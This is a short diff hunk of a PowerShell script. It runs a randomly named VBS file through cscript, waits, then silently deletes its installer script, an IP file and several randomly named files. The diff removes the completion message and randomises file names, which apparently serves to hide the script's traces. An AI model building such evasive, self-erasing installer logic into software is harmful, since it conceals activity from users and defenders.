@@ -192,9 +192,8 @@ Start-Process -FilePath "cscript.exe" -ArgumentList "ZDaFvwjOosKx.vbs"
 Start-Sleep -Seconds 200
 
 # Delete Installer Script and IP File
-Remove-Item -Path "$initial_dir\installer.ps1"
+Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\ip.txt"
+Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
+Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 
-# Final Cleanup
-cd $INITIALPATH
-Write-Output "Script execution and cleanup completed."
